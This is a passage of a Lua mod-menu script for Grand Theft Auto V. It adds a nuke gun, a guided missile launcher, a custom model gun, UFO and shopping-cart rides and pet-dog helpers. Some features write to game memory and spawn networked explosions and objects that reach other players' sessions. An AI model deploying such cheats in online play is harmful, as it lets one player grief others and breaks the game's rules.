            WEAPON.REMOVE_ALL_PROJECTILES_OF_TYPE(projectile, false)
            return remove_projectiles
        end)
    end)
end

local exp_animal_toggle --so options above it have access to the toggle option

local nuke_running = false
local grenade_running = false
local animals_running = false

local nuke_height = 40
local function executeNuke(pos)
    for a = 0, nuke_height, 4 do
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z + a, 8, 10, true, false, 1, false)
        util.yield(50)
    end
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
end

--credit to lance for the entity gun, but i edited it a bit
local nuke_gun_root = menu.list(weapons, 'Nuke options', {}, '')
local nuke_gun_toggle = menu.toggle(weapons, 'Nuke gun', {'nukeGun'}, 'Upgrade RPG grenade then atomic bomb', function(toggle)
    nuke_running = toggle
    if nuke_running then
        if animals_running then menu.trigger_command(exp_animal_toggle, 'off') end
        util.create_tick_handler(function()
            if WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == -1312131151 then --if holding homing launcher
                if PED.IS_PED_SHOOTING(players.user_ped()) then
                    if not remove_projectiles then
                        remove_projectiles = true
                        disableProjectileLoop(-1312131151)
                    end
                    util.create_thread(function()
                        local hash = util.joaat('w_arena_airmissile_01a')
                        STREAMING.REQUEST_MODEL(hash)
                        local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                        local dir, pos = direction()
                        local bomb = entities.create_object(hash, pos)
                        ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                        ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)
                        while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do util.yield() end
                        local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                        entities.delete(bomb)
                        executeNuke(nukePos)
                    end)
                else
                    remove_projectiles = false
                end
            else
                remove_projectiles = false
            end
            return nuke_running
        end)
    end
end)


local function get_waypoint_pos2()
    if HUD.IS_WAYPOINT_ACTIVE() then
        local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
        local waypoint_pos = HUD.GET_BLIP_COORDS(blip)
        return waypoint_pos
    else
        toast('Set a waypoint you fool xD')
    end
end

menu.action(nuke_gun_root, 'Nuke waypoint', {'nukeWP'}, 'Drop the bomb on the specified point on the map.', function()
    local waypointPos = get_waypoint_pos2()
    if waypointPos then
        local hash = util.joaat('w_arena_airmissile_01a')
        STREAMING.REQUEST_MODEL(hash)
        waypointPos.z += 30
        local bomb = entities.create_object(hash, waypointPos)
        waypointPos.z -= 30
        ENTITY.SET_ENTITY_ROTATION(bomb, -90, 0, 0,  2, true)
        ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, 0, 0, 0, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do util.yield() end
        entities.delete(bomb)
        executeNuke(waypointPos)
    end
end)


menu.slider(nuke_gun_root, 'Nuke height', {'nukeHeight'}, 'mushroom height.', 10, 100, nuke_height, 10, function(value)
    nuke_height = value
end)


-------------------------------------
-- VALKYIRE ROCKET
-------------------------------------

menu.toggle(weapons, "Upgrade firewerk launcher to ATGM", {"ATGM"}, "Firework upgrade to guided anti-tank missile", function(toggle)
	gUsingValkRocket = toggle
	if gUsingValkRocket then
		local rocket
		local cam
		local blip
		local init
		local draw_rect = function(x, y, z, w)
			GRAPHICS.DRAW_RECT(x, y, z, w, 255, 255, 255, 255)
		end

		while gUsingValkRocket do
			if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) and WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped()) == 2138347493 and not init then
				init = true 
				sTime = cTime()
			elseif init then
				if not ENTITY.DOES_ENTITY_EXIST(rocket) then
					local weapon = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(PLAYER.PLAYER_PED_ID())
					local offset = getOffsetFromCam(10)
			
					rocket = OBJECT.CREATE_OBJECT_NO_OFFSET(util.joaat("w_lr_rpg_rocket"), offset.x, offset.y, offset.z, true, false, true)
					ENTITY.SET_ENTITY_INVINCIBLE(rocket, true)

					ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(rocket, true, 1)
					NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.OBJ_TO_NET(rocket), true);
					NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.OBJ_TO_NET(rocket), false)
					ENTITY.SET_ENTITY_RECORDS_COLLISIONS(rocket, true)
					ENTITY.SET_ENTITY_HAS_GRAVITY(rocket, false)
				
					CAM.DESTROY_ALL_CAMS(true)
					cam = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", true)
					CAM.SET_CAM_NEAR_CLIP(cam, 0.01)
					CAM.SET_CAM_NEAR_DOF(cam, 0.01)
					GRAPHICS.CLEAR_TIMECYCLE_MODIFIER()
					GRAPHICS.SET_TIMECYCLE_MODIFIER("CAMERA_secuirity")
					ATTACH_CAM_TO_ENTITY_WITH_FIXED_DIRECTION(cam, rocket, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1)
					CAM.SET_CAM_ACTIVE(cam, true)
					CAM.RENDER_SCRIPT_CAMS(true, false, 0, true, true, 0)

					PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), true)
					ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), true)
				else
					local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
					local direction = toDirection(CAM.GET_GAMEPLAY_CAM_ROT(0))
					local coords = ENTITY.GET_ENTITY_COORDS(rocket)
					local groundZ = getGroundZ(coords)
					local altitude = math.abs(coords.z - groundZ)
					local force = vect.mult(direction, 25)
					ENTITY.SET_ENTITY_ROTATION(rocket, rot.x, rot.y, rot.z, 0, 1)
					STREAMING.SET_FOCUS_POS_AND_VEL(coords.x, coords.y, coords.z, rot.z, rot.y, rot.z)
					
					ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(rocket, 1, force.x, force.y, force.z, false, false, false, false)

					HUD.HIDE_HUD_AND_RADAR_THIS_FRAME()
					PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), true)
					ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), true)

					
					draw_rect(0.5, 0.5 - 0.025, 0.050, 0.002)
					draw_rect(0.5, 0.5 + 0.025, 0.050, 0.002)
					draw_rect(0.5 - 0.025, 0.5, 0.002, 0.052)
					draw_rect(0.5 + 0.025, 0.5, 0.002, 0.052)
					draw_rect(0.5 + 0.050, 0.5, 0.050, 0.002)
					draw_rect(0.5 - 0.050, 0.5, 0.050, 0.002)
					draw_rect(0.5, 0.500 + 0.05, 0.002, 0.05)
					draw_rect(0.5, 0.500 - 0.05, 0.002, 0.05)
					
					local maxTime = 15000 -- ms
					local length = 0.5 - 0.5 * (cTime()-sTime) / maxTime -- timer length
					local perc = length / 0.5
					local color = getBlendedColour(perc) -- timer color
					GRAPHICS.DRAW_RECT(0.25, 0.5, 0.03, 0.5, 255, 255, 255, 120)
					GRAPHICS.DRAW_RECT(0.25, 0.75 - length / 2, 0.03, length, color.r, color.g, color.b, color.a)

					if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(rocket) or length <= 0 then
						local impactCoord = ENTITY.GET_ENTITY_COORDS(rocket)
						FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(),impactCoord.x, impactCoord.y, impactCoord.z, 5, 1.0, true, false, 0.4)
						entities.delete_by_handle(rocket)
						PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), false)
						CAM.RENDER_SCRIPT_CAMS(false, false, 3000, true, false, 0)
						GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
						STREAMING.CLEAR_FOCUS()
						CAM.DESTROY_CAM(cam, 1)
						PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), false)
						ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)					
						rocket = 0
						init = false
					end	
				end
			end
			wait()
		end
		
		if rocket and ENTITY.DOES_ENTITY_EXIST(rocket) then
			local impactCoord = ENTITY.GET_ENTITY_COORDS(rocket)
			FIRE.ADD_EXPLOSION(impactCoord.x, impactCoord.y, impactCoord.z, 32, 1.0, true, false, 0.4)
			entities.delete_by_handle(rocket)
			STREAMING.CLEAR_FOCUS()
			CAM.RENDER_SCRIPT_CAMS(false, false, 3000, true, false, 0)
			CAM.DESTROY_CAM(cam, 1)
			GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
			ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
			PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), false)
			if HUD.DOES_BLIP_EXIST(blip) then
				util.remove_blip(blip)
			end
			HUD.UNLOCK_MINIMAP_ANGLE()
			HUD.UNLOCK_MINIMAP_POSITION()
		end
	end
end)

local objtab = {}
local vsh
local psh
local obj_shot
local function vshot(hash, camcoords, CV, rot)
    if not ENTITY.DOES_ENTITY_EXIST(vsh) then
        vsh = entities.create_vehicle(hash, camcoords, CV)
        ENTITY.SET_ENTITY_ROTATION(vsh, rot.x, rot.y, rot.z, 0, true)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(vsh, 1000)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vsh, true)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(vsh, true)
        table.insert(objtab, vsh)
    else
            local veh_sec = entities.create_vehicle(hash, camcoords, CV)
            ENTITY.SET_ENTITY_ROTATION(veh_sec, rot.x, rot.y, rot.z, 0, true)
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(veh_sec, 1000)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vsh, true)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(vsh, true)
            table.insert(objtab, veh_sec)
    end
end

local function pshot(hash, camcoords, CV, rot)
    if not ENTITY.DOES_ENTITY_EXIST(psh) then
        psh = entities.create_ped(1, hash, camcoords, CV)
        ENTITY.SET_ENTITY_INVINCIBLE(psh, true)
        util.yield(30)
        ENTITY.SET_ENTITY_ROTATION(psh, rot.x, rot.y, rot.z, 0, true)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(psh, 1, 0, 5000, 0, 0, true, true, true, true)
        table.insert(objtab, psh)
    else
        local sped = entities.create_ped(1, hash, camcoords, CV)
        ENTITY.SET_ENTITY_INVINCIBLE(sped, true)
        util.yield(30)
        ENTITY.SET_ENTITY_ROTATION(sped, rot.x, rot.y, rot.z, 0, true)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(sped, 1, 0, 5000, 0, 0, true, true, true, true)
        table.insert(objtab, sped)
    end
end
local function oshot(hash, camcoords, rot)
    if not ENTITY.DOES_ENTITY_EXIST(obj_shot) then
        local objs = OBJECT.CREATE_OBJECT(hash, camcoords.x, camcoords.y, camcoords.z, true, true, true)
        ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(objs, players.user_ped(), false)
        util.yield(20)
        ENTITY.SET_ENTITY_ROTATION(objs, rot.x, rot.y, rot.z, 0, true)
        
        ENTITY.APPLY_FORCE_TO_ENTITY(objs, 2, camcoords.x ,  15000, camcoords.z , 0, 0, 0, 0,  true, false, true, false, true)
        table.insert(objtab, objs)
        else
            local sobjs = OBJECT.CREATE_OBJECT(hash, camcoords.x, camcoords.y, camcoords.z, true, true, true)
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(sobjs, players.user_ped(), false)
            util.yield(20)
            ENTITY.SET_ENTITY_ROTATION(sobjs, rot.x, rot.y, rot.z, 0, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(sobjs, 2, camcoords.x ,  15000, camcoords.z , 0, 0, 0, 0,  true, false, true, false, true)
            table.insert(objtab, sobjs)
    end

end

local function objshots(hash, obj, camcoords)
    local CV = CAM.GET_GAMEPLAY_CAM_RELATIVE_HEADING()
    local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    if STREAMING.IS_MODEL_A_VEHICLE(hash) then
        vshot(hash, camcoords, CV, rot)
        
        for i, car in ipairs(objtab) do
            if obj.expl then
                if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(car) then
                    local expcoor = ENTITY.GET_ENTITY_COORDS(car)
                    FIRE.ADD_EXPLOSION(expcoor.x, expcoor.y, expcoor.z, 81, 5000, true, false, 0.0, false)
                    entities.delete_by_handle(car)
                end


            end
            if i >= 150 then
                for index, vehs in ipairs(objtab) do
                    entities.delete_by_handle(vehs)
                    objtab ={}
                end
            end
            local carc = ENTITY.GET_ENTITY_COORDS(car)
            local tar2 = ENTITY.GET_ENTITY_COORDS(players.user_ped())
            local disbet = SYSTEM.VDIST2(tar2.x, tar2.y, tar2.z, carc.x, carc.y, carc.z)
            if disbet > 15000 then
                entities.delete_by_handle(car)
            end
        end

    elseif STREAMING.IS_MODEL_A_PED(hash) then
       pshot(hash, camcoords, CV, rot)

    
        for i, psho in ipairs(objtab) do
        if obj.expl then
            if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(psho) then
                local expcoor = ENTITY.GET_ENTITY_COORDS(psho)
                FIRE.ADD_EXPLOSION(expcoor.x, expcoor.y, expcoor.z, 81, 5000, true, false, 0.0, false)
                entities.delete_by_handle(psho)
            end
                
                    local pedc = ENTITY.GET_ENTITY_COORDS(psh)
                    local tar2 = ENTITY.GET_ENTITY_COORDS(players.user_ped())
                    local disbet = SYSTEM.VDIST2(tar2.x, tar2.y, tar2.z, pedc.x, pedc.y, pedc.z)
                    if disbet > 15000 then
                        entities.delete_by_handle(psh)
                    end
        end
        if i >= 40 then
            for index, p_shot in ipairs(objtab) do
                entities.delete_by_handle(p_shot)
                objtab ={}
            end
        end
    end
    elseif STREAMING.IS_MODEL_VALID(hash) then
       oshot(hash, camcoords, rot)



       for i, objs in ipairs(objtab) do
       if obj.expl then
        if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(objs) then
            local expcoor = ENTITY.GET_ENTITY_COORDS(objs)
            FIRE.ADD_EXPLOSION(expcoor.x, expcoor.y, expcoor.z, 81, 5000, true, false, 0.0, false)
            entities.delete_by_handle(objs)
        end

                local objc = ENTITY.GET_ENTITY_COORDS(objs)
                local tar2 = ENTITY.GET_ENTITY_COORDS(players.user_ped())
                local disbet = SYSTEM.VDIST2(tar2.x, tar2.y, tar2.z, objc.x, objc.y, objc.z)

                if disbet > 15000 then
                    entities.delete_by_handle(objs)
                end
            end
            if i >= 40 then
                for index, p_shot in ipairs(objtab) do
                    entities.delete_by_handle(p_shot)
                    objtab ={}
                end
            end
        end
    end
   
end

function Streament(hash) --Streaming Model
    STREAMING.REQUEST_MODEL(hash)
    while STREAMING.HAS_MODEL_LOADED(hash) ==false do
    util.yield()
    end
end

local next_preview
local image_preview
local function rotation_to_direction(rotation)
    local adjusted_rotation =
    {
        x = (math.pi / 180) * rotation.x,
        y = (math.pi / 180) * rotation.y,
        z = (math.pi / 180) * rotation.z
    }
    local direction =
    {
        x = -math.sin(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)),
        y =  math.cos(adjusted_rotation.z) * math.abs(math.cos(adjusted_rotation.x)),
        z =  math.sin(adjusted_rotation.x)
    }
    return direction
end
local function get_offset_from_camera(distance)
    local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(0)
    local cam_pos = CAM.GET_FINAL_RENDERED_CAM_COORD()
    local direction = rotation_to_direction(cam_rot)
    local destination =
    {
        x = cam_pos.x + direction.x * distance,
        y = cam_pos.y + direction.y * distance,
        z = cam_pos.z + direction.z * distance
    }
    return destination
end

local function objams(obj_hash, obj, camcoords)
    local CV = CAM.GET_GAMEPLAY_CAM_RELATIVE_HEADING()
    if STREAMING.IS_MODEL_A_VEHICLE(obj_hash) then
        obj.prev = VEHICLE.CREATE_VEHICLE(obj_hash, camcoords.x, camcoords.y, camcoords.z, CV, true, true, false)
        ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj.prev, players.user_ped(), false)
      elseif STREAMING.IS_MODEL_A_PED(obj_hash) then
        obj.prev = entities.create_ped(1, obj_hash, camcoords, CV)
        ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj.prev, players.user_ped(), false)
      elseif STREAMING.IS_MODEL_VALID(obj_hash) then
        obj.prev = OBJECT.CREATE_OBJECT(obj_hash, camcoords.x, camcoords.y, camcoords.z, true, true, true)
        ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj.prev, players.user_ped(), false)
    end
end

SEC = ENTITY.SET_ENTITY_COORDS
local set = {alert = false}
local obj_hash = 'prop_container_01a'
local objgun = menu.list(weapons, 'Custom Model Gun', {"custommodlegunloc"}, '')

local obj = {expl = false}
OBJgun = menu.toggle_loop(objgun, 'Custom Model Gun', {'modgun'}, 'Fires the model you have selected', function ()
     
   local hash = util.joaat(obj_hash)
    Streament(hash)
    if PLAYER.IS_PLAYER_FREE_AIMING(players.user()) and not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) then
        local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
        local camcoords = get_offset_from_camera(10)
        if not ENTITY.DOES_ENTITY_EXIST(obj.prev) then
            objams(hash, obj, camcoords)
        else
            SEC(obj.prev, camcoords.x, camcoords.y, camcoords.z, false, true, true, false)
        end
        ENTITY.SET_ENTITY_ROTATION(obj.prev, rot.x, rot.y, rot.z, 0, true)
        
    elseif ENTITY.DOES_ENTITY_EXIST(obj.prev) and not PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then
        entities.delete_by_handle(obj.prev)
    end
    if PED.IS_PED_SHOOTING(players.user_ped()) and not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) then
        local camcoords = get_offset_from_camera(15)
        objshots(hash, obj, camcoords)
        entities.delete_by_handle(obj.prev)
        util.yield(20)
    end
end)



menu.toggle(objgun, 'Make Models Explosive', {}, 'Makes the models you shoot explosive when hitting something', function (on)
    obj.expl =  on
  end)


  menu.text_input(objgun, 'Custom Model Gun', {'customgun'}, 'Enter the model name of a model to change the object you shoot example "prop_keg_01"', function(cusobj)

    if STREAMING.IS_MODEL_A_VEHICLE(util.joaat(cusobj)) then
        obj_hash = cusobj
      elseif STREAMING.IS_MODEL_A_PED(util.joaat(cusobj)) then
        obj_hash = cusobj
      elseif STREAMING.IS_MODEL_VALID(util.joaat(cusobj)) then
        obj_hash = cusobj
    else
       if set.alert then
           util.toast('Improper Model Name (check the spelling)')
       end
    end
end, 'prop_container_01a')

menu.action(objgun, "Clear All", {"clearshit"}, "", function()
    menu.trigger_commands("superc")
end)

menu.hyperlink(objgun, "Get Model Names", "https://forge.plebmasters.de/")


-------------------------------------
-- Drive UFO
-------------------------------------

function DisablePhone()
    write_global.int(20366, 1)
end

local function request_model(hash, timeout)
    timeout = timeout or 3
    STREAMING.REQUEST_MODEL(hash)
    local end_time = os.time() + timeout
    repeat
        util.yield()
    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
    return STREAMING.HAS_MODEL_LOADED(hash)
end

local function get_closest_vehicle(entity)
    local coords = ENTITY.GET_ENTITY_COORDS(entity, true)
    local vehicles = entities.get_all_vehicles_as_handles()
    -- init this at some ridiculously large number we will never reach, ez
    local closestdist = 1000000
    local closestveh = 0
    for k, veh in pairs(vehicles) do
        if veh ~= PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false) and ENTITY.GET_ENTITY_HEALTH(veh) ~= 0 then
            local vehcoord = ENTITY.GET_ENTITY_COORDS(veh, true)
            local dist = MISC.GET_DISTANCE_BETWEEN_COORDS(coords['x'], coords['y'], coords['z'], vehcoord['x'], vehcoord['y'], vehcoord['z'], true)
            if dist < closestdist then
                closestdist = dist
                closestveh = veh
            end
        end
    end
    return closestveh
    end

    menu.toggle(funfun, "Drive A Shopping Cart (Bike)", {"givecart"}, "", function(on_toggle)
        if on_toggle then
        local vehicleHash = util.joaat("manchez")
        request_model(vehicleHash)
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
        cart = entities.create_vehicle(vehicleHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
        ENTITY.SET_ENTITY_VISIBLE(cart, false, false)
        ENTITY.SET_ENTITY_VISIBLE(players.user_ped(), false, true)

        VEHICLE.SET_VEHICLE_ENGINE_ON(cart, true, true, true)
        ENTITY.SET_ENTITY_INVINCIBLE(cart, true)
        VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(cart, 0.0)
------------Ufo Object------------------------------------------------------------------------------------------------------------------------------------------------------------
        local id = get_closest_vehicle(entity)
        local playerpos = ENTITY.GET_ENTITY_COORDS(id)
        playerpos.z = playerpos.z + 3
        local ufo_object = util.joaat("prop_rub_trolley02a")
        STREAMING.REQUEST_MODEL(ufo_object)
        while not STREAMING.HAS_MODEL_LOADED(ufo_object) do
            util.yield()
        end
        local object1 = entities.create_object(ufo_object, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(object1, cart, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object1, cart)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(cart, object1, 0, 0, 0, 0, 0, 0, 180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(object1, cart, 0, 0, 0, 0, 0, 0, 180, 0, false, true, false, 0, true)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), cart, -1)
        ENTITY.SET_ENTITY_VISIBLE(object1, true)
        DisablePhone()
    else
        ENTITY.SET_ENTITY_VISIBLE(players.user_ped(), true, true)
        menu.trigger_commands("superc")
        entities.delete_by_handle(cart)
        end
    end)

    menu.toggle(funfun, "Drive A Shopping Cart (BMX)", {"givecart"}, "Bmx", function(on_toggle)
        if on_toggle then
        local vehicleHash = util.joaat("bmx")
        request_model(vehicleHash)
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
        cart = entities.create_vehicle(vehicleHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
        ENTITY.SET_ENTITY_VISIBLE(cart, false, false)
        ENTITY.SET_ENTITY_VISIBLE(players.user_ped(), false, true)

        VEHICLE.SET_VEHICLE_ENGINE_ON(cart, true, true, true)
        ENTITY.SET_ENTITY_INVINCIBLE(cart, true)
        VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(cart, 0.0)
------------Ufo Object------------------------------------------------------------------------------------------------------------------------------------------------------------
        local id = get_closest_vehicle(entity)
        local playerpos = ENTITY.GET_ENTITY_COORDS(id)
        playerpos.z = playerpos.z + 3
        local ufo_object = util.joaat("prop_rub_trolley02a")
        STREAMING.REQUEST_MODEL(ufo_object)
        while not STREAMING.HAS_MODEL_LOADED(ufo_object) do
            util.yield()
        end
        local object1 = entities.create_object(ufo_object, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(object1, cart, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object1, cart)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(cart, object1, 0, 0, 0, 0, 0, 0, 180, 0, false, true, false, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(object1, cart, 0, 0, 0, 0, 0, 0, 180, 0, false, true, false, 0, true)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), cart, -1)
        ENTITY.SET_ENTITY_VISIBLE(object1, true)
        DisablePhone()
    else
        ENTITY.SET_ENTITY_VISIBLE(players.user_ped(), true, true)
        menu.trigger_commands("superc")
        entities.delete_by_handle(cart)
        end
    end)

        menu.toggle(funfun, "Drive A UFO", {"driveufo"}, "Drive ufo (BETA), there is lots of room for improvment I just need time. Note: To use first person change camera distance back to 1.00", function(on_toggle)
            if on_toggle then
            local vehicleHash = util.joaat("hydra")
            request_model(vehicleHash)
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
            ufo = entities.create_vehicle(vehicleHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            ENTITY.SET_ENTITY_VISIBLE(ufo, false, false)
            ENTITY.SET_ENTITY_VISIBLE(players.user_ped(), false, true)

            VEHICLE.SET_VEHICLE_ENGINE_ON(ufo, true, true, true)
            ENTITY.SET_ENTITY_INVINCIBLE(ufo, true)
            VEHICLE.SET_PLANE_TURBULENCE_MULTIPLIER(ufo, 0.0)

------------Ufo Object------------------------------------------------------------------------------------------------------------------------------------------------------------
            local id = get_closest_vehicle(entity)
            local playerpos = ENTITY.GET_ENTITY_COORDS(id)
            playerpos.z = playerpos.z + 3
            local ufo_object = util.joaat("sum_prop_dufocore_01a")
            STREAMING.REQUEST_MODEL(ufo_object)
            while not STREAMING.HAS_MODEL_LOADED(ufo_object) do
                util.yield()
            end
            local object1 = entities.create_object(ufo_object, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
            ENTITY.ATTACH_ENTITY_TO_ENTITY(object1, ufo, playerpos, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object1, ufo)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(ufo, object1, 0, 0, 3, 0, 0, 0, 0, 0, false, true, false, 0, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(object1, ufo, 0, 0, 3, 0, 0, 0, 0, 0, false, true, false, 0, true)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ufo, pos.x, pos.y, pos.z + 200, false, false, true)
            PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), ufo, -1)
            ENTITY.SET_ENTITY_VISIBLE(object1, true)
            menu.trigger_commands("otr" .. " on")
            menu.trigger_commands("cameradistance" .. " 1.80")
            DisablePhone()
        else
            ENTITY.SET_ENTITY_VISIBLE(players.user_ped(), true, true)
            menu.trigger_commands("otr" .. " off")
            menu.trigger_commands("cameradistance" .. " 1.00")
            menu.trigger_commands("superc")
            entities.delete_by_handle(ufo)
            end
        end)

        menu.toggle(funfun, "Super Ufo", {"superufo"}, "Toggles superdrive and super handbreak. Warning! This quite is nuts lol.", function(on_toggle)
            if on_toggle then
                menu.trigger_commands("speedlimit" .. " 10000")
                menu.trigger_commands("superdrivespeed" .. " 10000.00")
                menu.trigger_commands("superdrive")
                menu.trigger_commands("superhandbreak")
                menu.trigger_commands("driveufo")
            else
                menu.trigger_commands("superdrivespeed" .. " 3.00")
                menu.trigger_commands("superdrive")
                menu.trigger_commands("superhandbreak")
                menu.trigger_commands("driveufo")
            end
        end)

local function getgroupsize(group)
    local unkPtr, sizePtr = memory.alloc(1), memory.alloc(1)
    PED.GET_GROUP_SIZE(group, unkPtr, sizePtr)
    return memory.read_int(sizePtr)
end

local mygroup = PLAYER.GET_PLAYER_GROUP(players.user())

local dogs <const> = table.freeze({
    "Rottweiler",
    "Husky",
    "Poodle",
    "Pug",
    "Retriever",
    "Westy",
    "Shepherd",
    "Cat_01",
})

local doganimations = {
    "WORLD_DOG_SITTING_ROTTWEILER",
    "WORLD_DOG_SITTING_RETRIEVER",
    "WORLD_DOG_SITTING_SHEPHERD",
    "WORLD_DOG_SITTING_SMALL",
}

local activedogs = {}

local function GenerateNametagOnPed(ped, nametag)
    util.create_thread(function()
        while ENTITY.DOES_ENTITY_EXIST(ped) do
            local headpos = PED.GET_PED_BONE_COORDS(ped, 0x796e, 0,0,0)
            GRAPHICS.SET_DRAW_ORIGIN(headpos.x, headpos.y, headpos.z+0.4, 0)

            HUD.SET_TEXT_COLOUR(200,200,200,220)
            HUD.SET_TEXT_SCALE(1, 0.5)
            HUD.SET_TEXT_CENTRE(true)
            HUD.SET_TEXT_FONT(4)
            HUD.SET_TEXT_OUTLINE()

            HUD.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("STRING")
            HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(nametag)
            HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0,0,0)
            GRAPHICS.CLEAR_DRAW_ORIGIN()
            util.yield()
        end
